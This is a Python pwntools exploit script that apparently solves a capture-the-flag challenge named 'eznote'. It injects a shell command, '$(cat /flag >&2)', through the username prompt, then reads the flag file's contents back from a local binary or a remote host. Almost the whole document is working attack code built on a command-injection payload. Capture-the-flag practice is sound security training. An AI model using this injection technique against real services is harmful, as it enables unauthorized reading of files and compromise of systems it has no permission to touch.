#!/usr/bin/env python3
from pwn import *
import argparse
import re
import time
from subprocess import STDOUT


def parse_args():
    p = argparse.ArgumentParser(description="Solve eznote via username command injection")
    p.add_argument("--binary", default="chall", help="Path to local binary")
    p.add_argument("--host", help="Remote host")
    p.add_argument("--port", type=int, help="Remote port")
    p.add_argument("--flag-path", default="/flag", help="Flag file path")
    p.add_argument("--timeout", type=float, default=2.0, help="Read timeout in seconds")
    return p.parse_args()


def start(args):
    if args.host and args.port:
        return remote(args.host, args.port)
    return process(args.binary, stderr=STDOUT)


def main():
    args = parse_args()
    io = start(args)

    io.recvuntil(b"Username:")
    payload = f"$(cat {args.flag_path} >&2)".encode()
    io.sendline(payload)

    io.recvuntil(b"> ")
    io.sendline(b"2")

    buf = b""
    deadline = time.time() + args.timeout
    while time.time() < deadline:
        chunk = io.recv(timeout=0.2)
        if chunk:
            buf += chunk

    if not buf:
        print("No output captured. The service may not forward stderr.")
        return

    m = re.search(rb"flag\{.*?\}", buf)
    if m:
        print(m.group(0).decode(errors="replace"))
    else:
        print(buf.decode(errors="replace"))


if __name__ == "__main__":
    main()
